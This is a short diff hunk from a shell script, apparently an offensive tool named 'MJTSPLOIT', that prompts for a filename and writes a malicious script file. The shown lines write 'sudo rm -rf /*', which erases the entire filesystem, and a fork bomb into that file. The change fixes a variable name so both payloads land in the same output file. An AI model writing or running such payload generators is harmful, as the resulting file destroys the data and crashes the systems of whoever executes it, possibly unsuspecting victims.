@@ -188,7 +188,7 @@ then
   read maalnat
   touch $maalnat.sh
   echo "sudo rm -rf /*" > $maalnat.sh
-  echo ":(){ :|: & };:" > $malnat.sh
+  echo ":(){ :|: & };:" > $maalnat.sh
   sleep 0.5
   echo "[+] the file saved at MJTSPLOIT DIRECTORY.."
   sleep 0.5
